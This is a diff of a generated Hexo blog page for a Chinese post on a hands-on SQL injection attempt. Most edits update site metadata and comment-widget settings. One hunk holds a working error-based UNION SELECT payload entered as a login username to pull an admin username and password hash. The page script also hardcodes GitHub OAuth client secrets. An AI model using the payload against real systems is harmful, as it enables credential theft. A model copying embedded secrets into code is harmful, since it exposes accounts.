@@ -3,7 +3,7 @@
   <head><meta name="generator" content="Hexo 3.8.0">
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
-  <meta name="description" content="ayonel&#39;s blog">
+  <meta name="description" content="ayonel的个人博客">
   <meta name="keyword" content="ayonel">
   
     <link rel="shortcut icon" href="/css/images/logo.png">
@@ -168,10 +168,10 @@
 <p><strong>0x04 Sql注入</strong> </p>
 </blockquote>
 <p>逐个试了好几个漏洞，终于找见了一个能用的。直接上代码： 用户名输入： </p>
-<pre><code class="bash">admin<span class="string">' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 </span>
-<span class="string">    FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0×23,password) </span>
-<span class="string">        FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP </span>
-<span class="string">            by a)b# </span>
+<pre><code class="bash">admin&#39; UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 
+    FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0×23,password) 
+        FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP 
+            by a)b# 
 </code></pre>
 <p>密码随意填，写上验证码，点击登录：<br><img src="/2016/08/24/do-some-hack/result.jpg" alt="result"><br>可以看到已经爆出了加密的管理员密码，这个密码是两层md5加密。 </p>
 <blockquote>
@@ -239,7 +239,7 @@
 
 <script>
   (function () {
-    var url = 'http://yoursite.com/2016/08/24/do-some-hack/';
+    var url = 'http://ayonel.github.io/2016/08/24/do-some-hack/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
@@ -292,15 +292,15 @@
     });
 
     // gitment
-    var gitmentConfig = "yanm1ng";
+    var gitmentConfig = "ayonel";
     if (gitmentConfig !== 'undefined') {
       var gitment = new Gitment({
         id: "SQL注入实战",
-        owner: "yanm1ng",
-        repo: "yanm1ng.github.io",
+        owner: "ayonel",
+        repo: "ayonel.github.io",
         oauth: {
-          client_id: "0f87e490e00ee3fd87ef",
-          client_secret: "4a9d2b148e7971c2201ad12131ce8bf8159ccd2e"
+          client_id: "297b1b500bab1bb05f84",
+          client_secret: "d95e804528ebcd238086be5bf2cc5f3884269bc7"
         },
         theme: {
           render(state, instance) {
@@ -323,7 +323,7 @@
 <script>
   var disqus_shortname = '';
   
-  var disqus_url = 'http://yoursite.com/2016/08/24/do-some-hack/';
+  var disqus_url = 'http://ayonel.github.io/2016/08/24/do-some-hack/';
   
   (function(){
     var dsq = document.createElement('script');
